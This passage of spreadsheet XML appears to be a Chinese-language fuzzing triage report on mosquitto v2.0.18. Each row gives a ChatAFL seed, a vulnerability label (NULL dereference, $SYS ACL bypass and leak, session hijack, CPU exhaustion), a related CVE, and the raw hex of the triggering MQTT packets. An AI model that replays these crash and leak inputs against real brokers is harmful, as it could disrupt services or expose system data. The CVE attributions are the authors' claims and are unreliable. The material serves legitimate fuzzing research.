        </is>
      </c>
      <c r="J5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31">
      <c r="A531" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000007,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B531" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C531" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000007,sev:3,cat:020e)中的REQUEST DATA提取出来(295B)\u000a4.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0x020e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E531" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:020e ===\u000a大小: 3133B (报告+请求数据)\u000a请求数据: 295B\u000a\u000a---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MQTT请求序列(295B原始二进制)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PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[4]: SUBSCRIBE PacketID=17 Topics=['se\x82\x19\x00´\x00\x14$share/gr'(QoS=0)] | raw_header=8216001100117365821900b400142473\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=322f73656e736f722f23023b3e001c24\u000aMsg[6]: (不完整,139B) raw=f3a80fd0cdfa34cda2e8e809ea9f287d90e750ded1386150fc656e736f74696d6502820b00100006\u000a(尾部139B): f3a80fd0cdfa34cda2e8e809ea9f287d90e750ded1386150fc656e736f74696d6502820b00100006245359532f2300821600</f>
        <v/>
      </c>
      <c r="F5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3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31" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J53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3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32">
      <c r="A532" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B532" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C532" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(218B)\u000a4.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32" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 797B (报告+请求数据)\u000a请求数据: 218B\u000a\u000a---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MQTT请求序列(218B原始二进制)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PacketID=110 Topics=[''(零长度!QoS=2), 't'(QoS=1)] | raw_header=8209006e00000200017401\u000aMsg[4]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=1 retain=False payload='\x00oäª½\x8b\x9e\x9c0\x04\x06\x8c\x81\x96!£-\x9cÀ¹' | raw_header=3232001c2473686172652f67332f686f\u000aMsg[5]: (不完整,85B) raw=82e803100006245367532f230082160011001173656e736f722f74656d702f726f6f6d3101821200\u000a(尾部85B): 82e803100006245367532f230082160011001173656e736f722f74656d702f726f6f6d310182120012000d686f6d652f2b2f</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J53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3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33">
      <c r="A533" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B533" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C533" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(474B)\u000a4.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533" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 967B (报告+请求数据)\u000a请求数据: 474B\u000a\u000a---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MQTT请求序列(474B原始二进制) ---\u000aMsg[1]: CONNACK session_present=114 reason_code=47 | raw_header=2f67722f006f7069632f6c657665104f\u000aMsg[2]: PUBCOMP PacketID=25866 | raw_header=7572650a3a9301e61b2473686172642f\u000aMsg[3]: PUBREL PacketID=25964 | raw_header=6576656c332f6c657d656c34712309c1\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=101B | raw_header=307a0013245359532f62726f6b65722f\u000aMsg[5]: (不完整,9B) raw=d8910402000402003c\u000a(尾部9B): d8910402000402003c</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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3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34">
      <c r="A534" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B534" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C534" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000008,sev:3,cat:020e)中的REQUEST DATA提取出来(155B)\u000a4.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0x020e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E534" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:020e ===\u000a大小: 860B (报告+请求数据)\u000a请求数据: 155B\u000a\u000a---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MQTT请求序列(155B原始二进制)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PacketID=16 Topics=[] | raw_header=820b00100e06245359532f2300\u000aMsg[4]: SUBSCRIBE PacketID=17 Topics=['senso\x00\x00\x00\x00mp/room1'(QoS=1)] | raw_header=82160011001173656e736f000000006d\u000aMsg[5]: SUBSCRIBE PacketID=18 Topics=['home/+/status'(QoS=2)] | raw_header=82120012000d686f6d652f2b2f737461\u000aMsg[6]: PUBLISH Topic='deviced\x00\x00\x00elemetry/#' QoS=0 retain=False payload='' | raw_header=3016001464657669636564000000656c\u000aMsg[7]: PINGREQ  | raw_header=c000\u000aMsg[8]: AUTH  | raw_header=f100</f>
        <v/>
      </c>
      <c r="F5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3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34" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J53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35">
      <c r="A535" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B535" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C535" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(139B)\u000a4.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535" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 1036B (报告+请求数据)\u000a请求数据: 139B\u000a\u000a---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MQTT请求序列(139B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=28 Topics=['home/+/temperature'(QoS=1), '#'(QoS=1)] | raw_header=821b001c0012686f6d652f2b2f74656d\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload='%q×£\x96'\x00ÝÎ¢Bl&amp;X\x80Ç\x7f' | raw_header=31260013245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=0d8000\u000aMsg[4]: (不完整,67B) raw=00e44a00800080712f74d2d2d2d2d2d2d2ff00141004f06e736f1c3b12e3800000e44a008000722f\u000a(尾部67B): 00e44a00800080712f74d2d2d2d2d2d2d2ff00141004f06e736f1c3b12e3800000e44a008000722f2b2f8703020022026d70</f>
        <v/>
      </c>
      <c r="F5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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J53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3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36">
      <c r="A536" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B536" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C536" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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536" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0305 ===\u000a大小: 626B (报告+请求数据)\u000a请求数据: 84B\u000a\u000a---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MQTT请求序列(84B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v1 ClientID=''(0B) clean_session=False keepalive=16s [持久会话] | raw_header=1013000001000010000000101e076675\u000aMsg[2]: (不完整,63B) raw=6f722f726f6f6d312f74656d7032322e353211000c636d642f6c696768742f6f6e00053162026565\u000a(尾部63B): 6f722f726f6f6d312f74656d7032322e353211000c636d642f6c696768742f6f6e00053162026565656565651173656e736f</f>
        <v/>
      </c>
      <c r="F5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3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36" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J53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36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37">
      <c r="A537" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B537" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C537" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(293B)\u000a4.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37" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0306 ===\u000a大小: 938B (报告+请求数据)\u000a请求数据: 293B\u000a\u000a---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MQTT请求序列(293B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=12032s [自动清理会话] | raw_header=101300044d51545404022f0000003c00\u000aMsg[2]: PUBREC PacketID=13922 | raw_header=5f63366202701c82120000000073656e\u000aMsg[3]: SUBSCRIBE PacketID=3472 Topics=[] | raw_header=82240d90130be095b069260009612f62\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=109B | raw_header=3082010013245359532f62726f6b6572</f>
        <v/>
      </c>
      <c r="F5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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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38">
      <c r="A538" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B538" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C538" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E538" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 1002B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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MQTT请求序列(120B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=4096s [持久会话] | raw_header=101300044d5154540419100000003c7a\u000aMsg[2]: PUBCOMP PacketID=33298 | raw_header=701c82120001000de01c8d1a1144b967\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=312f746573742f2b146465766963652f\u000aMsg[4]: (不完整,20B) raw=2f622f632f642f652f662f673c682f692f73e000\u000a(尾部20B): 2f622f632f642f652f662f673c682f692f73e000</f>
        <v/>
      </c>
      <c r="F5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38" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J5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3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39">
      <c r="A539" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B539" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C539" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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39" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 560B (报告+请求数据)\u000a请求数据: 153B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(153B原始二进制) ---\u000aMsg[1]: DISCONNECT 断开连接 | raw_header=ef00\u000aMsg[2]: SUBSCRIBE PacketID=1225 Topics=[''(零长度!QoS=1)] | raw_header=825104c900001d245359532f62726f6b\u000aMsg[3]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=2 retain=False payload='\x04Ê\x13\x01\x04\x02\x1fÕañ#\x1dâ\x0b\x85¨îr\x03\x00\x01täx`î\x14NÃßdþ}ø\x17¼' | raw_header=3442001c2473686172652f67332f686f</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J53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3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40">
      <c r="A540" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B540" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C540" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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40" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 700B (报告+请求数据)\u000a请求数据: 126B\u000a\u000a---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MQTT请求序列(126B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=5852 Topics=[''(零长度!QoS=0), ''(零长度!QoS=2), 'a/b/c/d/e'(QoS=2)] | raw_header=821416dc0000000000020009612f622f\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=1 retain=True payload_len=51B | raw_header=3b60002b766572792f646565702f746f\u000aMsg[3]: CONNACK  | raw_header=2f00\u000aMsg[4]: SUBSCRIBE  | raw_header=8000\u000aMsg[5]: (不完整,2B) raw=1c0f\u000a(尾部2B): 1c0f</f>
        <v/>
      </c>
      <c r="F5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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J54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4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41">
      <c r="A541" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B541" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C541" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(509B)\u000a4.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41" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 1054B (报告+请求数据)\u000a请求数据: 509B\u000a\u000a---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MQTT请求序列(509B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[''(零长度!QoS=0)] | raw_header=8013000400003c007a5f63366202ff1c\u000aMsg[2]: TYPE0  | raw_header=0d73656e733b722f2b2f74656d7000a2\u000aMsg[3]: PUBREL PacketID=29551 | raw_header=656e736f722f72ff4e6d312f74656d00\u000aMsg[4]: CONNACK session_present=116 reason_code=101 | raw_header=2b2f74656d7065726174757265013d9f\u000aMsg[5]: PUBCOMP PacketID=29281 | raw_header=706572617475726509000bf2c16574fc\u000aMsg[6]: (不完整,107B) raw=039a653fccdb4b537867ded7c30dd2669198fad5c30316ebe051954f1131608d7f00000024736861\u000a(尾部107B): 039a653fccdb4b537867ded7c30dd2669198fad5c30316ebe051954f1131608d7f0000002473686172652f677270312f2326</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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4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42">
      <c r="A542" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B542" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C542" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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542" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 980B (报告+请求数据)\u000a请求数据: 223B\u000a\u000a---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MQTT请求序列(223B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1322 Topics=[''(零长度!QoS=3)] | raw_header=8248052a000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/grp2/sensor/#' QoS=0 retain=True payload_len=108B | raw_header=39820100142473686172652f67727032\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=340e00746d73743b63db1364ff000000</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J54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4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43">
      <c r="A543" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B543" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C543" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(145B)\u000a4.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543" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 616B (报告+请求数据)\u000a请求数据: 145B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(145B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v30 ClientID=''(26988B) clean_session=True keepalive=75s Will=YES [自动清理会话] | raw_header=107500044d5154541e26004b4e696c6c\u000aMsg[2]: (不完整,26B) raw=73656e736f722f2b2f01000d73656e736f722f2b2f74656d7000\u000a(尾部26B): 73656e736f722f2b2f01000d73656e736f722f2b2f74656d7000</f>
        <v/>
      </c>
      <c r="F5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4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43" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J54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5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44">
      <c r="A544" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B544" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C544" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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544" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 2538B (报告+请求数据)\u000a请求数据: 25B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(25B原始二进制) ---\u000aMsg[1]: PINGREQ  | raw_header=c000\u000aMsg[2]: (不完整,23B) raw=c7ea8caa8c10c28c674c9ab9746573742f2301c0ffe000\u000a(尾部23B): c7ea8caa8c10c28c674c9ab9746573742f2301c0ffe000</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J54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45">
      <c r="A545" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B545" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C545" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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545" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 838B (报告+请求数据)\u000a请求数据: 200B\u000a\u000a---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MQTT请求序列(200B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=137 Topics=[] | raw_header=824b00891c26000a746573742f746f70\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=89B | raw_header=3b78001d245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F5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4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45" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J54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4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46">
      <c r="A546" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:008a</t>
        </is>
      </c>
      <c r="B546" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C546" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(143B)\u000a4.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546" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:008a ===\u000a大小: 2842B (报告+请求数据)\u000a请求数据: 143B\u000a\u000a---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MQTT请求序列(143B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d5f30fefefefefefefefefefefefefe\u000aMsg[3]: (不完整,44B) raw=fefefefefefefe16fffefefefefefefefefefefefefefefefefefefefefefe318206000100062301\u000a(尾部44B): fefefefefefefe16fffefefefefefefefefefefefefefefefefefefefefefe318206000100062301c31cf900</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J54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47">
      <c r="A547" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B547" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C547" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(2066B)\u000a4.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547" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 2541B (报告+请求数据)\u000a请求数据: 2066B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(2066B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1075be74611075262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e6262626262626262626262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=267f2626262626262626262626262626\u000aMsg[6]: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PUBREL PacketID=26669 | raw_header=6974682d7370656369616c2140232425\u000aMsg[10]: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raw_header=26262626262626262626263326262626\u000aMsg[23]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[24]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626264826262626262626\u000aMsg[25]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000a(尾部820B): 2626262626262626262626262626262626262626262626267f26262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F5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54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547" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J54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54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48">
      <c r="A548" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B548" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C548" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(582B)\u000a4.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548" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 1119B (报告+请求数据)\u000a请求数据: 582B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(582B原始二进制) ---\u000aMsg[1]: (不完整,582B) raw=e280ff2f7401000d604c606060606060606060606047606060606060606060606060606060606060\u000a(尾部582B): e280ff2f7401000d604c60606060606060606060604760606060606060606060606060606060606060606060606000000040</f>
        <v/>
      </c>
      <c r="F5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4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48" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J54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5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49">
      <c r="A549" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:00ca</t>
        </is>
      </c>
      <c r="B549" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C549" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:3,cat:00ca)中的REQUEST DATA提取出来(1182B)\u000a4.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0x00ca\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E549" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00ca ===\u000a大小: 3886B (报告+请求数据)\u000a请求数据: 1182B\u000a\u000a---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CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(1182B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[] | raw_header=861600044d0004262626262626262626\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e6262626262626262626262626262626\u000aMsg[3]: CONNACK  | raw_header=260126\u000aMsg[4]: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raw_header=26262626262626044d00042626262626\u000aMsg[13]: CONNACK session_present=38 reason_code=38 | raw_header=26262626200026262626262626262626\u000aMsg[14]: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 | raw_header=2600\u000aMsg[19]: TYPE0  | raw_header=09612f622f632f642f65000d24736861\u000aMsg[20]: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raw_header=26262626262626262626262626262626\u000a(尾部214B): 262626262626262626262626262626262626262626262626262626262646de26262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F5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9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9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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J549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4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50">
      <c r="A550" s="2" t="inlineStr">
        <is>
